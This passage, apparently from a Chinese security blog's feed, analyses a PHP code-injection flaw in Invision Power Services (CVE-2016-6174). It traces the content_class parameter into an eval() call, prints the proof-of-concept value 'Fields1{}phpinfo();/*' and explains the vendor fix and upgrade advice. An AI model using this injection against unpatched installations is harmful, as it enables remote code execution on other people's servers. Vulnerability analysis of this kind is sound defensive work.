class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">IPS</span>\<span class="title">core</span>\<span class="title">modules</span>\<span class="title">front</span>\<span class="title">system</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">_content</span> <span class="keyword">extends</span> \<span class="title">IPS</span>\<span class="title">Dispatcher</span>\<span class="title">Controller</span></span></span><br></pre></td></tr></table></figure><p>满足条件，之后便执行<code>execute()</code>方法。</p><p>在<code>/system/Dispatcher/Controller.php</code>中有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func( <span class="keyword">array</span>( <span class="keyword">$this</span>, \IPS\Request::i()-&gt;do ) );</span><br></pre></td></tr></table></figure><p>以上函数就是将<code>execute()</code>函数作为回调函数执行，而<code>execute()</code>函数在<code>/system/Dispatcher/Dispatcher.php</code>中的<code>i()</code>方法执行。<code>i()</code>方法将<code>Controller</code>作为一个静态类名；等同于现在将执行<code>IPS\Dispatcher\Controller</code>中的<code>find()</code>方法也就是执行<code>IPS\core\modules\front\system</code>中的<code>find()</code>方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="string">'IPS\\'</span> .implode(<span class="string">'\\'</span>,explode(<span class="string">'_'</span>IPS\Request::i()-&gt;content_class ) );</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPS\Content'</span>, class_parents( $class ) ) )</span><br><span class="line">&#123;</span><br><span class="line">\IPS\Output::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对我们传进来的<code>content_class</code>参数进行了处理，处理后的<code>$class</code>为<code>IPS\cms</code>，由于<code>class_exists()</code>函数本身的机制，导致它默认执行<code>__autoload</code>。</p><p>php在底层寻找<code>IPS\cms</code>（<code>/applications/cms/Application.php</code>），<code>$class</code>作为参数被调入其中的<code>spl_autoload_register()</code>函数。其中在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( mb_substr( $class, <span class="number">0</span>, <span class="number">14</span> ) === <span class="string">'IPS\cms\Fields'</span> <span class="keyword">and</span> is_numeric( mb_substr( $class, <span class="number">14</span>, <span class="number">1</span> ) ) )</span><br><span class="line">&#123;</span><br><span class="line">  $databaseId = mb_substr( $class, <span class="number">14</span> );</span><br><span class="line">  <span class="keyword">eval</span>( <span class="string">"namespace IPS\\cms; class Fields&#123;$databaseId&#125; extends Fields &#123; public static \$customDatabaseId = $databaseId; &#125;"</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将我们构造的poc的前14个字符截断，与<code>IPS\cms\Fields</code>进行比较，之后判断第15个字符是否为数字或字符串，满足条件后，再将截取前14个字符串之后的值作为<code>$databaseId</code>，也就是：</p><p><code>$databaseId=1{}phpinfo();/*</code></p><p>  将其带入到<code>eval()</code>函数中，造成我们构造的php代码执行。</p><h2 id="三、官方修复分析"><a href="#三、官方修复分析" class="headerlink" title="三、官方修复分析"></a>三、官方修复分析</h2><p>经过我们的分析对比</p><p>发现 ／applications/cms/Application.php这个文件中 原来的<code>spl_autoload_register()</code>和更新后</p><p><img src="http://blog.knownsec.com/wp-content/uploads/2016/08/ips_fix-1024x413.png" alt="ips_fix.png"></p><p>我们可以看到，官方利用<code>intval()</code>函数对最后传入的<code>$class</code>进行来整数验证</p><p>使得传入的<code>$class</code>的第14位后被限定成为一个整数，防止传入字符串进入<code>eval()</code></p><blockquote><p><strong>而升级PHP版本带来的修复是</strong></p></blockquote><p>在<code>PHP</code>的新版本<code>&gt;=5.4.25</code>或者<code>&gt;=5.5.9</code>里变更了<code>class_exists</code>的机制</p><p>而低于的版本则没有此限制可以正常触发漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$class = <span class="string">'IPS'</span> . implode( <span class="string">''</span>, explode( <span class="string">'_'</span>, IPSRequest::i()-&gt;content_class ) );</span><br><span class="line"><span class="keyword">if</span> ( ! class_exists( $class ) <span class="keyword">or</span> ! in_array( <span class="string">'IPSContent'</span>, class_parents( $class ) ) )</span><br><span class="line">&#123;</span><br><span class="line">    IPSOutput::i()-&gt;error( <span class="string">'node_error'</span>, <span class="string">'2S226/2'</span>, <span class="number">404</span>, <span class="string">''</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处</p><p><code>$class=&quot;IPS\cms\Fields1{}phpinfo();/*&quot;</code>的时候不再触发<code>class_exists()</code>去加载</p><p><code>／applications/cms/Application.php</code>中的<code>spl_autoload_register()</code>故不再触发漏洞</p><h2 id="四、漏洞修复"><a href="#四、漏洞修复" class="headerlink" title="四、漏洞修复"></a>四、漏洞修复</h2><ul><li>及时升级程序版本</li><li><code>PHP</code> <code>5.4.x</code>升级至<code>5.4.25</code>以上，<code>5.5.x</code>升级至<code>5.5.9</code>以上</li><li><code>IPS</code> 升级至<code>4.12.3.1</code>以上</li></ul><h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p><a href="https://www.seebug.org/vuldb/ssvid-92096" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-92096</a></p><p><a href="https://invisionpower.com/" target="_blank" rel="noopener">https://invisionpower.com/</a></p><p><a href="http://windows.php.net/downloads/releases/archives/" target="_blank" rel="noopener">http://windows.php.net/downloads/releases/archives/</a></p><p><a href="http://karmainsecurity.com/KIS-2016-11" target="_blank" rel="noopener">http://karmainsecurity.com/KIS-2016-11</a></p><p><a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174" target="_blank" rel="noopener">http://cve.mitre.org/cgi-bin/cvename.cgi?name=2016-6174</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近刚报的一个IPS的漏洞，个人感觉使用性并不是很强，但是审计过程却是很有趣的，拿来分享一下。&lt;/p&gt;
    
    </summary>
    
      <category term="漏洞分析" scheme="https://lucifaer.com/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="漏洞分析" scheme="https://lucifaer.com/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="PHP" scheme="https://lucifaer.com/tags/PHP/"/>
    
  </entry>
  
</feed>
